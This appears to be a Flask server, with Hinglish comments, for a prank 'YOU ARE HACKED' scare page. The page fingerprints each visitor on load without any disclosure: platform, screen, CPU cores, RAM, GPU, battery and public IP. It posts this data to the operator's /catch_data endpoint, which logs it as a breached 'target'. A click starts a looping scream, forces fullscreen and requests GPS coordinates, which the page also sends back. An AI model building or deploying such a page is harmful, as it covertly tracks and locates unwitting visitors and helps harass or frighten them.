from flask import Flask, render_template_string, send_from_directory, request, jsonify
import os

app = Flask(__name__)

# Local audio file serve karne ke liye
@app.route('/scream.mp3')
def send_audio():
    return send_from_directory(os.getcwd(), 'scream.mp3')

# --- Yahan Target ka saara data receive hoga ---
@app.route('/catch_data', methods=['POST'])
def catch_data():
    target_info = request.json
    print("\n" + "💀" * 20)
    print("   TARGET SYSTEM BREACHED   ")
    for key, value in target_info.items():
        print(f"[*] {key.upper()}: {value}")
    print("💀" * 20 + "\n")
    return jsonify({"status": "captured"})

@app.route('/log')
def log_page():
    html_payload = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: 'Courier New', monospace; }
            #bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.4; }
            #scare {
                position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
                z-index: 100; color: #ff0000; font-size: 8vw; font-weight: 900;
                text-align: center; pointer-events: none; letter-spacing: 5px;
                text-shadow: 0 0 20px #f00; animation: neonPulse 1s infinite;
            }
            @keyframes neonPulse { 0%, 100% { opacity: 1; text-shadow: 0 0 20px #f00; } 50% { opacity: 0.3; text-shadow: 0 0 5px #f00; } }
            
            .win { position: absolute; background: rgba(10, 0, 0, 0.9); border: 1px solid #f00; box-shadow: 0 0 10px #f00; z-index: 10; overflow: hidden; }
            .win-header { background: #f00; color: #000; font-weight: bold; padding: 3px; font-size: 11px; }
            .win-content { padding: 10px; color: #ff0000; font-size: 16px; font-weight: bold; line-height: 1.4; }
            
            #win1 { top: 5%; left: 5%; width: 40%; height: 35%; }
            #win2 { top: 10%; right: 5%; width: 45%; height: 40%; }
            #win3 { bottom: 10%; left: 5%; width: 42%; height: 35%; }
            #win4 { bottom: 5%; right: 5%; width: 40%; height: 30%; }
            
            #trigger { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: crosshair; }
        </style>
    </head>
    <body>
        <div id="trigger" onclick="ignite()"></div>
        <canvas id="bg-canvas"></canvas>
        <div id="scare">YOU ARE HACKED</div>

        <div class="container">
            <div class="win" id="win1">
                <div class="win-header">HARDWARE_SNATCHER</div>
                <div class="win-content" id="hw-display">Dumping Data...</div>
            </div>
            <div class="win" id="win2">
                <div class="win-header">KERNEL_LOGS</div>
                <div class="win-content" id="log-box"></div>
            </div>
            <div class="win" id="win3">
                <div class="win-header">GEO_LOCATOR</div>
                <div class="win-content" id="geo-box">Waiting for Signal...</div>
            </div>
            <div class="win" id="win4">
                <div class="win-header">CPU_OVERLOAD</div>
                <div class="win-content" style="font-size: 30px; text-align: center;">VAL:<br><span id="perc">0%</span></div>
            </div>
        </div>

        <audio id="scream" loop><source src="/scream.mp3" type="audio/mpeg"></audio>

        <script>
            // 1. Digital Rain Background
            const canv = document.getElementById('bg-canvas');
            const ctx = canv.getContext('2d');
            canv.width = window.innerWidth; canv.height = window.innerHeight;
            const drops = Array(Math.floor(canv.width/15)).fill(1);
            function rain() {
                ctx.fillStyle = "rgba(0,0,0,0.15)"; ctx.fillRect(0,0,canv.width,canv.height);
                ctx.fillStyle = "#800"; ctx.font = "15px monospace";
                drops.forEach((y, i) => {
                    ctx.fillText(Math.floor(Math.random()*2), i*15, y*15);
                    if(y*15 > canv.height && Math.random() > 0.98) drops[i]=0;
                    drops[i]++;
                });
            }
            setInterval(rain, 50);

            // 2. --- THE LOGIC: Instant Data Extraction ---
            async function snatchAll() {
                let report = {
                    platform: navigator.platform,
                    resolution: window.screen.width + "x" + window.screen.height,
                    touch_pts: navigator.maxTouchPoints || 0,
                    cores: navigator.hardwareConcurrency || "Unknown",
                    ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "N/A"
                };

                // IP Address (Public via API)
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    report.ip_address = ipData.ip;
                } catch(e) { report.ip_address = "Blocked/No API Access"; }

                // GPU Info
                const gl = document.createElement('canvas').getContext('webgl');
                if (gl) {
                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
                    report.gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Generic GPU";
                }

                // Battery Status
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    report.battery_level = (b.level * 100) + "%";
                    report.charging = b.charging ? "YES" : "NO";
                }

                // Update UI Window
                document.getElementById('hw-display').innerHTML = `
                    IP: ${report.ip_address}<br>
                    BAT: ${report.battery_level} (${report.charging})<br>
                    GPU: ${report.gpu.substring(0, 30)}...<br>
                    RES: ${report.resolution}<br>
                    TOUCH: ${report.touch_pts} Pts
                `;

                // --- FORAN DATA BHEJO ---
                fetch('/catch_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(report)
                });
            }

            // 3. User Interaction Trigger (Scream & Location)
            function ignite() {
                document.getElementById('scream').play();
                document.getElementById('trigger').style.display = 'none';
                if(document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();

                // GPS Location (Permission required)
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(p => {
                        const geo = { lat: p.coords.latitude, lon: p.coords.longitude };
                        document.getElementById('geo-box').innerHTML = `LAT: ${geo.lat}<br>LON: ${geo.lon}<br>LOCKED!`;
                        fetch('/catch_data', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(geo)});
                    }, () => {
                        document.getElementById('geo-box').innerHTML = "LOCATION DENIED";
                    });
                }
            }

            // Page Load hote hi data nikal lo
            window.onload = snatchAll;

            // Fake Logs Filler
            setInterval(() => {
                const l = ["cracking_hash", "stealing_tokens", "void_eye_active", "rooting_system"];
                const box = document.getElementById('log-box');
                box.innerHTML += "> " + l[Math.floor(Math.random()*l.length)] + "<br>";
                if(box.innerHTML.split('<br>').length > 10) box.innerHTML = box.innerHTML.split('<br>').slice(1).join('<br>');
            }, 200);

            let v = 0; setInterval(() => { v = (v + 41) % 999999; document.getElementById('perc').innerText = v; }, 60);
        </script>
    </body>
    </html>
    """
    return render_template_string(html_payload)

if __name__ == '__main__':
    # Flask ko 8080 port par run karein
    app.run(host='0.0.0.0', port=8080)